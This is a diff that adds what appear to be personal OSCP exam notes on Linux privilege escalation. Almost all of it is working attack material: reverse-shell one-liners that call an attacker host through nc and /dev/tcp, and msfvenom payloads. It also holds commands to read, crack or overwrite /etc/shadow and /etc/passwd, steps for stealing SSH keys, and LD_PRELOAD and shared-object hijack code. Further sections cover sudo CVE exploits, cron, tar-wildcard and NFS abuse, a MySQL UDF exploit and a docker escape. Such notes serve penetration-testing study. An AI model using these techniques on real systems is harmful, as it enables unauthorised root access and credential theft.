@@ -97,5 +97,560 @@ https://github.com/Esot3riC/OSCP-prep/blob/main/PrivilegeEscalation/Linux/linuxP
      2. ^M means exploit code written using window new line charactes: it casuse error to compli an exploit
            $ sed -e "s/^M//" 39535.sh > privesc.sh
 
+#TTY escape:- https://netsec.ws/?p=337
+     - python -c 'import pty; pty.spawn("/bin/sh")'
+
+https://github.com/Esot3riC/OSCP-prep/blob/main/PrivilegeEscalation/Linux/linuxPrivEsc.pdf
+
+PDF On Gmail Subject:- OSCP Privilege escalation PDF
+
+# important manual checklist
+                 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+                 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+                 https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+                 https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
+                 https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources
+
+# Techniqe To Swaping Root Shell:-----
+    1. "rootbash" SUID:- create copy of /bin/bash. owned by root and SUID bit set.
+           1.1 select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)  run:- /tmp/rootbash -p
+           1.2 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
+
+    2. Custom Executables:- instance where root process execute another process which can be controled.
+           2.1  int main() {
+                    setuid(0);
+                    system("/bin/bash -p");
+                }
+
+            Compile using: $ gcc -o <name> <filename.c>
+
+    3. msfvenom:- for reverse shell use msfvenom to generate executable file (.elf)
+            3.1 msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f elf > shell.elf
+                msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+                use NETCAT or multi/handlre to caught reverse shell.
+
+    4. Native Reverse Shell:- https://github.com/mthbernardes/rsg tool
+                use NETCAT to caught reverse shell.
+
+
+#Tools:----
+
+    1. Tools for enumeration:--
+            1.1. lse.sh (Linux Smart enumuration):- Bash script
+                  https://github.com/diego-treitos/linux-smart-enumeration
+
+            1.2. LinEnum:- advance, copy intresting files, search for files contain keyword e.g. passwd
+                  https://github.com/rebootuser/LinEnum
+
+            1.3. linPEAS
+                  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS      
+
+            1.4  other tools:- 
+                  
+                  https://github.com/AlessandroZ/BeRoot
+                  http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+            1.4 Linux Exploit suggester:-
+                 https://github.com/mzet-/linux-exploit-suggester
+                 https://github.com/jondonas/linux-exploit-suggester-2
+                      command:- ./linux-exploit-suggester-2.pl -k 2.6.32    
+
+            1.5 linuxprivchecker.py
+                  https://github.com/sleventyeleven/linuxprivchecker 
+                  https://github.com/linted/linuxprivchecker (python)
+
+----------------------------------------------------------------------------------------------------------------
+#Exploits:---
+----------------------------------------------------------------------------------------------------------------
+
+1. Exploit kernel :-    uname -a 
+                        cat /proc/version
+                        cat /etc/issue  
+                        lscpu #CPU info
+                        hostname 
+                        Linux-Exploit-Suggester:- https://github.com/mzet-/linux-exploit-suggester 
+                                                  https://github.com/jondonas/linux-exploit-suggester-2
+                                                     command:- ./linux-exploit-suggester-2.pl -k 2.6.32  
+                        Searchsploit (search payload for kernal exploit)
+                        Kernal_Exploits:- https://github.com/lucyoa/kernel-exploits  
+
+2. Weak File Permissions:-- if we read the file owned by root, can get usefull info (passwd, hashes, keys)
+                            if we write the file owned by root, can insert or modify info (passwd, hashes, keys)
+         2.1 Looking for passwords:-
+              $:- history
+              $:- find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+              $:- Run linpeas or run LinEnum
+              $:- check other files (.ovpn, ssh, authorise key, specific configuration, credentails hidden inside web server)
+
+         2.2 Readable /etc/shadow (contain user passwd hashes)
+              $:- Run linpeas or run LinEnum or lse
+              $:- ls -l /etc/shadow -----  cat /etc/shadow
+              $:- check for hash type (https://hashcat.net/wiki/doku.php?id=example_hashes)
+              $:- john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt (convert hash to plain text)
+              $:- su root (enter crack password)
+
+         2.3 Writable /etc/shadow     
+              $:- Run linpeas or run LinEnum or lse
+              $:- ls -l /etc/shadow -----  cat /etc/shadow  
+              $:- mkpasswd -m sha-512 maddy123   (generate sha-512 hash of password) (local machine)
+              $:- vim /etc/shadow (replase root user password hash)
+              $:- su root (enter newly created password)
+
+         2.4 Writable /etc/passwd
+
+            2.4.1 change root user password
+              $:- Run linpeas or run LinEnum or lse
+              $:- ls -l /etc/passwd -----  cat /etc/passwd  (root:x:0:0:root:/root:/bin/bash) 
+              $:- replace :x: with hashed password OR delete :X: means no passwrd (x instruct linux to look for passwd in /etc/shadow file)
+              $:- openssl passwd "maddy123" (generate hash passwd)
+              $:- replace x with password (root:WdYLXCvRwqjXE:0:0:root:/root:/bin/bash)
+              $:- su root (enter newly created password)
+            
+            2.4.2 add a new user  (ID 0)            
+              $:- copy root password line (root:WdYLXCvRwqjXE:0:0:root:/root:/bin/bash) 
+              $:- paste root password line with new name (newroot:WdYLXCvRwqjXE:0:0:root:/root:/bin/bash)  
+
+         2.5 .ssh OR id_rsa file  (always check Hidden files in common location)
+              $:- grep PermitRootLogin /etc/ssh/sshd_config (root login allowed via SSH)
+              $:- find / -name authorized_keys 2> /dev/null (check files)
+              $:- find / -name id_rsa 2> /dev/null (check files)
+              $:- cd .ssh  ----- cat root_key 
+              $:- copy ssh key to local machine (vim root_key)
+              $:- chmod 600 root_key  (give valid permission)
+              $:- ssh -i root_key root@10.10.226.40
+
+         2.6 Backup files:-  /root, /tmp, /var/backups, /var/logs, history file
+
+
+3. sudo:--  Run lse.sh or linux smart enumeration script
+               $:- sudo -v (check sudo version)
+               $:- sudo -l(list of program user is allowed to run via sudo)
+               $:- sudo su "switch user" OR sudo -u <username> <program> (run a program as a specific user Known Password)
+                    if su program not allowed, other commands($ sudo -s, $ sudo -i, $ sudo /bin/bash, $ sudo passwd, cat /etc/sodoers)
+
+          3.1 Shell Escape Sequences: if we restrict to run certain program vis SUDO, so we try to escape the program and spawn a shell. 
+                                      But initial program run with root priviledges. check video https://gtfobins.github.io/
+              $:- Run linpeas or run LinEnum or lse
+              $:- sudo -l(pick any command for e.g FIND command)
+              $:- go to https://gtfobins.github.io/ and search for FIND command
+              $:- copy the command and paste in victim machine to gain root shell
+
+          3.2 Abusing Intended Functionality: if program has the sudo rights but GTFObins shell escape is not possible then we try this 
+                                              Methodology. only able to read the first line of file.
+              $:- Run linpeas or run LinEnum or lse
+              $:- sudo -l(pick any command for e.g apache2 command)          
+              $:- sudo apache2 -f /etc/shadow (use other programs or commands like this) (sudo <program> privilege escalation)
+                    https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/ (wget exploit)
+                    https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/ 
+             
+          3.3  Environment Variables (LD_PRELOAD and LD_LIBRARY_PATH)
+          
+                3.3.1  LD_PRELOAD:- it can be set to the path od "shared object (.so) file". when set .so loaded before any other program. 
+                      $:- sudo -l (in comamnd response check "env_keep+=LD_PRELOAD" is their)
+                      $:- create a file preload.c (any name)
+                                  #include <stdio.h> or .io
+                                  #include <sys/types.h>
+                                  #include <stdlib.h>
+
+                                  void _init() {
+                                       unsetenv("LD_PRELOAD");
+                                       setresuid(0,0,0);
+                                       system("/bin/bash -p");
+                                  }
+
+                                               OR
+
+
+                                  #include <stdio.h>
+                                  #include <sys/types.h>
+                                  #include <stdlib.h>
+
+                                  void _init() {
+                                       unsetenv("LD_PRELOAD");
+                                       setgid(0);
+                                       setuid(0);
+                                       system("/bin/bash");
+                                  }            
+                       $:- gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c (complie the code in tmp folder)
+                       $:- sudo LD_PRELOAD=/tmp/preload.so find (find= we can use any command come in sudo -l response)  
+                       $:- id (get the rood)         
+
+                3.3.2  LD_LIBRARY_PATH:- it contain a set of directory where shared libraries are searched for first.                
+                      $:- sudo -l (in comamnd response check "env_keep+=LD_LIBRARY_PATH" is their)
+                      $:- ldd /usr/sbin/apache2 (pick any shared object come in response) (ldd command used to print shared libraries used by a program) pick any program from sudo -l
+                      $:- create a file library_path.c (any name)
+                                  #include <stdio.h> OR .io
+                                  #include <stdlib.h>
+                                  
+                                  static void hijack() __attribute__((constructor));
+                                  void hijack() {
+                                       unsetenv("LD_LIBRARY_PATH");
+                                       setresuid(0,0,0);
+                                       system("/bin/bash -p");
+                                  }
+                      $:-  gcc -o libcrypt.so.1 -shared -fPIC library_path.c (libcrypt.so.1 = come in ldd command response) 
+                      $:- sudo LD_LIBRARY_PATH=. apache2 (. = current directory where shell compiled)
+                      $:- id (root access) 
+
+
+           https://tryhackme.com/room/linuxprivescarena (Task 10  Privilege Escalation - Sudo (LD_PRELOAD)
+             --- command--- sudo -u#-1 /bin/bash (https://www.exploit-db.com/exploits/47502)
+             --- sudo < 1.8.26 is vulnerable to CVE-2019-18634
+
+          3.4 sudo (CVE: 2019-14287) https://www.exploit-db.com/exploits/47502
+              $:- sudo -l (output = (ALL, !root) NOPASSWD: /bin/bash)
+              $:- sudo -u#-1 /bin/bash (you will get the root user)
+
+          3.5 Sudo Buffer Overflow (CVE-2019-18634)  https://github.com/saleemrashid/sudo-cve-2019-18634
+                                                     https://www.exploit-db.com/exploits/47995
+                                                     https://access.redhat.com/security/cve/cve-2019-18634 
+              $:- sudo -l / sudo su root (if posswrod enter come in ****** then this is vulnerable)
+              $:- cat /etc/sudoers (permission denied)
+              $:- sudo -V (check version Sudo version > 1.8.26 is vulnerable to this CVE)
+              $:- perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id (outupt = Segmentation fault which basically means that we've tried to access some memory that we weren't supposed to be able to access)
+              $:- wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c (transfer the exploit to victim machine)
+              $:- gcc -o <output-file> <source-file> (complie the exploit)
+              $:- rnu the exploit then do # id
+
+ 
+             
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks
+4. Cron Jobs:-- it is a program or script which user can schedule to run at specific time or interval.
+                it run with security level of user who owns(create) them. It run using /bin/sh shell.
+                Crontab (cron table) files store the configuration of cron job.
+                    - user crontab file location /var/spool/cron or /var/spool/cron/Crontabs
+                    - system-wide crontab location /etc/crontabs
+
+          4.1 File Permissions (write Permissions) :- if we can write to a program or script which get run as a part of cron job,
+                                                      we can replace it with our own code.
+              $:- Run linpeas or run LinEnum or lse (./lse -l 1 -i)
+              $:- cat /etc/crontab (check whe cron job is running every minut or day) 
+              $:- locate overwrite.sh (if full path not give then use this command)
+              $:- ls -l /full/path/overwrite.sh (check we can edit this file?)
+              $:- edit the overwrite.sh file and add reverse shell
+                    #!/bin/bash
+
+                    bash -i >& /dev/tcp/192.0.0.0/53 0>&1
+
+              $:- set listner on attacher machine (nc -lvp 53)  
+
+                                         OR
+
+              $:- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /home/user/overwrite.sh (add data in file not delete it) 
+                   #!/bin/bash
+
+                   echo `date` > /tmp/useless
+                   cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+
+              $:- chmod +x /home/user/overwrite.sh 
+              $:- ls -l /tmp (check rootbash file is updated - time)              
+              $:- /tmp/bash -p
+              $:- id
+            
+
+          4.2 Path Environment Variables:- defaut $PATH for crontab is /usr/bin:/bin 
+                 if full or absolute path is not given to file or program and one of the $PATH directory is writable by us then we can 
+                 create a file with the same name as cron job. 
+              $:- Run linpeas or run LinEnum or lse (./lse -l 1 -i)
+              $:- cat /etc/crontab (check $PATH in output) the path come first is searched first
+              $:- create overwrite.sh file (in the path found in /etc/crontab PATH section)
+                    #!/bin/bash
+                    cp /bin/bash /tmp/rootbash
+                    chmod +s /tmp/rootbash
+
+              $:- chmod +x overwrite.sh
+              $:- watch -n 1 ls -l /tmp (check script is run or not)
+              $:- ls -l /tmp (check rootbash file is created)
+              $:- /tmp/rootbash -p
+              $:- id      
+ 
+                                 OR
+
+              $:- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh 
+              $:- chmod +x /home/user/overwrite.sh 
+              $:- ls -l /tmp (check rootbash file is updated - time)              
+              $:- /tmp/bash -p
+              $:- id
+
+
+          4.3 Wildcards * 
+              $:- Run linpeas or run LinEnum or lse (./lse -l 1 -i)
+              $:- cat /etc/crontab (check if their is * used in files present in crontab files)
+              $:- cat /full/path/overwrite.sh (is * present iin file) output = tar *
+              $:- create a reverse shell in local machine "shell.elf" and transfer it to victim, create listner also
+              $:- chmod +x shell.elf
+              $:- Use TAR specific command to run the script (check gtfobins if we get different command in /full/path/overwrite.sh file)
+                     touch ./--checkpoint=1
+                     touch ./--checkpoint-action=exec=shell.elf
+              $:- check listner for reverse shell                              
+
+                                         OR
+
+                  -check if their is * used in files
+                  -create a script in /home/user
+                   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+                   chmod +x runme.sh
+                  -Use TAR specific command to run the script
+                   touch /home/user/--checkpoint=1
+                   touch /home/user/--checkpoint-action=exec=runme.sh   (touch /home/user/--checkpoint-action=exec=sh\runme.sh) 
+                  -run bash file with -p 
+                  /tmp/bash -p   
+
+
+5. SUID / SGID Executables:-- SUID file execute with privileges of the file owner. 
+                              SGID file execute with privileges of the file group.
+
+                          - Run lse.sh or linpeas
+                          - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+                          - find / -perm -u=s -type f 2>/dev/null
+                          - find / -perm -04000 -ls 2>/dev/null
+
+
+                 5.1 Shell Escape Sequences:- 
+                     $:- find SUID/SGID bit set files using above mentioned command
+                     $:- go to https://gtfobins.github.io/ and search for bit set file
+                     $:- copy the command and paste in victim machine to gain root shell                    
+                        E.g. find / -prem -u=s -type f 2>/dev/null (use gtfobins)
+              
+              
+                 5.2 Known Exploits:- 
+                     $:- find SUID/SGID bit set files using above mentioned command.
+                     $:- check for "Uncommon setuid binaries" in lse.sh Output
+                     $:- confirm the version of the file/program (file full path --version / -v)
+                     $:- search for exploits (searchsploit, google, exploitDB, github)
+                     $:- get error from bash (/bin/sh^M: bad inetrceptor) means exploit writen using windows new line caracter
+                                        sed -i -e "s/^M//" exploit.sh (this can remove the caracters)  (^M = ctrl+V+M)
+                     $:- run the exploit again.
+
+                 5.3 Shared object Injection:- when a program execute it try to load shared objects it need. by using "Strace" we 
+                                             track system call and check share object if found or not. if we can write to location 
+                                             that program try to open we can create a shred object and get root.
+                     $:- find SUID/SGID bit set files using above mentioned command.
+                     $:- pick file like (/usr/bin/suid-so)
+                     $:- strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file" (or string /file/name)
+                     $:- in result how many shared objects (.so) files are their and can we write to that location
+                     $:- create a directory/ c file on the same location
+                     $:- create a file libcalc.c (any name found in strace output)
+                         #include <stdio.h>
+                         #include <stdlib.h>
+
+                         static void inject() __attribute__((constructor));
+                         void inject() {
+                               setuid(0);
+                               system("/bin/bash -p");
+                         }
+
+                                    OR
+
+                         #include <stdio.h>
+                         #include <stdlib.h>
+
+                         static void inject() __attribute__((constructor));
+                         void inject() {
+                              system(" cp /bin/bash  /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+                         }
+                         
+                     $:- gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
+                     $;- execute the file (/usr/local/bin/suid-so)
+                     $:- id
+
+                 5.4 Path Environment Variables (absolute path): $PATH environent variable contains a list directories where the shell 
+             should try to find programs. if a program tries to executing other program but only specifies the program name rather than
+              its for "absolute path" the shell will search the path directories until it is found. since the user has full control
+              over their path variable we can tell the shell to first look for programs in a directory we can write to. 
+
+                $:- env (to see Environment Variables)  
+                $:- print $PATH (to check all paths) 
+
+                     $:- find SUID/SGID bit set files using above mentioned command.
+                     $:- strings path/and/file/name
+                     $:- strace -v -f -e path/and/file/name 2>&1 | grep <command> for e.g. Service (found in strings command)
+                     $:- ltrace <command>
+                     $:- create file service.c
+                              int main() {
+                                   setuid(0);
+                                   system("/bin/bash -p");
+                              }
+
+                              OR
+
+                         make (one liner) malicious service file:-
+                          echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > tmp/service.c
+
+                     $:- gcc -o service Service.c    OR   gcc /tmp/service.c  -o /tmp/service
+                     $:- PATH=.$PATH path/and/file/name (it set path and run the service in one step)   
+                            OR (step 1) PATH=/tmp:$PATH (step 2) print $PATH (step 3) /use/local/bin/suid-env (run the env file now)  
+                     $:- id             
+             
+                                
+                     $:- what if thid ti,e give full(direct) path to service (/usr/sbin/service apache2 start)
+                     $:- Create a malicious Function
+                     $:- function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+                     $:- export -f /usr/sbin/service (Export the Function)
+                     $:- /usr/local/bin/suid-env2 (run he env file now)    
+                     $:- id    
+                    
+                 5.5 Abusing shell features (if Bash version < 4.2-048) (exploit full psth to service)
+                     $:- if BASH version is lower then < 4.2-048, allow us to define bash functions with / in their name. these functions then take presidence on any executable with identival(same) path.
+                     $:- find SUID/SGID bit set files using above mentioned command.
+                     $:- /bin/sh --version
+                     $:- strings /usr/local/bin/suid-env2 (example only)
+                     $:- strace -v -f -e /usr/local/bin/suid-env2 2>&1 | grep <command> for e.g. /usr/sbin/Service (found in strings command)
+                     $:- function /usr/sbin/service { /bin/bash -p; }   (Create a malicious Function)
+                     $:- export -f /usr/sbin/service (export thr function)
+                     $:- /usr/local/bin/suid-env2  (run the program which contain service command with full path)
+                     $:- id
+
+                 5.6 Abusing shell features (if Bash version < 4.4)
+                     $:- bash has debuggable mode which can enable using -x command OR by modifing SHELLOPTS environent variable to include "xtrace". SHELLOPTS is read only, but "env command" allows SHELLOPTS to be set.  
+                     $:- in debuggable mode, bash use "PS4" to display extra prompt for debug statement. this "PS4" variable include an command which execute everytime it is shown.
+                     $:- find SUID/SGID bit set files using above mentioned command.
+                     $:- /bin/sh --version (< 4.4 inherit PS4 when EV when running as root)
+                     $:- strings /usr/local/bin/suid-env2 (example only)
+                     $:- strace -v -f -e /usr/local/bin/suid-env2 2>&1 | grep <command> 
+                     $:- env -i SHELLOPTS=xtrace PS4='<test>' /usr/local/bin/suid-env2 (this <any command> added before each line in output)
+                     $:- env -i SHELLOPTS=xtrace PS4='$(whoami)' /usr/local/bin/suid-env2 (output should contain root in responce)
+                     $:- env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
+                     $:- env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+                     $:- /tmp/rootbash -p
+                     $:- id
+
+                 5.7 Binary Symlinks (ngnix > 1.6.2 (if suid bit set for sudo then this can be exploited))
+                     $:- ngnix:- it is a HTTP and reverse proxy server. Exploit logs created by ngnix. (www-data to root)
+                     $:- if we compromise web server we get "www-data" user. 
+                     $:- ./Linux-exploit-suggester (output ngnixed-root.sh)
+                     $:- dpkg -l | grep ngnix (check its version)
+                     $:- find / -perm -04000 -ls 2>/dev/null (check SUDO has SUID bit set)
+                     $:- ./ngnixed-root.sh /var/log/ngnix/error.log (check ngnix log file location first)
+                     $:- above script create a Symblink (Symblink = reference to other filr or directory)
+                     $:- id
+
+                       https://tryhackme.com/room/linuxprivescarena
+
+    
+    
+    
+    
+6. Capabilities:- (very similar to SUID in concept)
+                 two type of processes 1. privilege 2. unprivilege
+                 1. privilege processes :- user ID=0 means root. it bypass all kernel permission checks. after kernal 2.2,divide the priviledges that are associate with super user in to distinct units called Capabilities.
+                 2. unprivilege processes :- other than 0. full checking  
+
+                 - check Capabilities
+                     $:- getcap -r / 2>/dev/null (result=/usr/bin/python2.6 = cap_setuid+ep) (ep = everything permitted)
+                 - exploit : run command 
+                     $:- /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'   
+
+                 -links:
+                 https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+                 https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099       
+
+7. Password & Keys:-- if week passwd storage and re-use Passwords (root passwd) can use to escalate priviledges. some time passwor 
+                      may be stored in plaintext in config file which is used by services.  
+                 7.1 History files :- find all history files (locate history but locate can't give hidden files)
+                       try to find passwords, file paths, keys , RSa_id
+                 7.2 Config file:- use confing files to store settings but some time it store passwords oe sensitive paths. 
+                 7.3 SSH Keys:- use to authenticate without password. (covered in weak file permissions)
+
+
+8. NFS (network file system):-- it use to mount shares, access, create modify files.
+                                is id configured in /etc/exports file.
+                                by default create file inherit the remote user id (means if i am root at my machine then i am also root in victim machine)
+                 7.1 root squashing:- root squashing is how NFS prevent on priv esc. If a remote user is root (uid=0) or claim to be
+                                  root then NFS will "squash" the user and treat it as nobody user in nobody group.
+
+                 $:- no_root_squash: it is an NFS configuration oprtion which turn off squashing. when include in writable share
+                         configuration, a remote user who identified as root can create file on the NFS share as local toor user. 
+                 $:- Run lse.sh (./lse.sh -l 2 -i) (check NFS share server is configured or not)
+                 $:- cat /etc/exports (Output contains= no_root_squash)  for e.g. /tmp * (no_root_squash)
+                            means we can erite file to it as root user over NFS
+              (run below commands on local machine as root user)
+                 $:- showmount -e 10.10.246.151 (confirm /tmp is availaible to mount exploit: Mount tmp) (victims IP)
+                 $:- mkdir /tmp/nfs 
+                 $:- sudo mount -o rw,vers=2 10.10.246.151:/tmp /tmp/nfs (mount directory)
+                 $:- msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+                 $:- chmod +xs /tmp/nfs/shell.elf (set SUID bit)
+              (run below commands on victim machine)
+                 $:- ls -l /tmp (confirm the shell is created)
+                 $:- /tmp/shell.elf (run the file)
+                 $: id
+              
+                                           OR
+
+                 $:- Run lse.sh (./lse.sh -l 2 -i) (check NFS share server is configured or not)
+                 $:- cat /etc/exports (Output contains= no_root_squash)  for e.g. /tmp * (no_root_squash) 
+              (run below commands on local machine as root user)
+                 $:- showmount -e 10.10.246.151 (confirm /tmp is availaible to mount exploit: Mount tmp) (victims IP)
+                 $:- mkdir /tmp/mountme 
+                 $:- sudo mount -o rw,vers=2 10.10.246.151:/tmp /tmp/mountme (mount directory)
+                 $:- echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c (create malicious file)
+                 $:- gcc /tmp/mountme/x.c -o /tmp/mountme/x 
+                 $:- chmod +s /tmp/mountme/x
+                 $:- /tmp/x (run command in VICTIM machine)                 
+           
+                
+9. Service Exploits:-- 
+                Run lse.sh enumuration script
+                $:- ps aux | grep "^root" (check services running as root and then check its versipn)
+                $:- <program> --version OR <program> -v
+                $:- dpkg -l | grep <program> (check program version in Debian like distribution)
+                $:- rpm -l | grep <program> (check program version in rpm distribution)
+                --> if we use ^$ bit version of debian we need to add * -fPIC * option (gcc -g -c file.c -fPIC)
+                
+                  mysqld Ver 5.1.73-1+deb6u1 Exploit steps (https://www.exploit-db.com/exploits/1518)
+                         1. $ gcc -g -c raptor_udf2.c -fPIC
+                         2. $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+                         3. $ mysql -u root -p   (no passwd)
+                         4. > use mysql;
+                         5. > insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so')); (enter own path)
+                         6. > select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+                         7. > select * from mysql.func;
+                         8. > select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');  (Priv esclation script)
+                         9. > exit
+                         10. $ /tmp/rootbash -p
+                         11. # id
+
+# Port Forwarding:- if for some reason, an exploit cannot run locally on the target machine, the port can be forward using SSH to 
+                     local (attacker) machine.
+
+                    # ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>
+                           ssh -R 4444:127.0.0.1:3306 maddy@10.9.1.35
+ 
+                  
+            7.1 Enumurate program version and exploit some time needs 7.2
+            7.2 post forwarding  
+            PSPY tool: to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute
+           https://github.com/DominicBreuker/pspy
+
+                                
+
+10. Docker exploitation:- gtfobins  (if we are menmer of docker  group  )
+                $:- ./linenum.sh (if we are member of docker  group)
+                $:- GTfobins (search for docker)
+                $:- docker run -v /:/mnt --rm -it bash chroot /mnt sh      
+                                       OR
+                    docker run -v /:/mnt --rm -it bash chroot /mnt/sh
+                $:- id , whoami (google docker group priv esc if not found anything)
+                                                                                 
+
+#commands:---
+
+     1. Check we can login to root using SSH:-
+          $ grep PermitRootLogin /etc/ssh/sshd_config
+
+     2. ^M means exploit code written using window new line charactes: it casuse error to compli an exploit
+           $ sed -e "s/^M//" 39535.sh > privesc.sh
+
+     3. PSPY tool: to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute
+           https://github.com/DominicBreuker/pspy      
+
+
+
+machine path exploit notes:-
+                          echo /bin/sh > curl
+                          chmod 777 curl
+                           export PATH=/tmp:$PATH
 
            
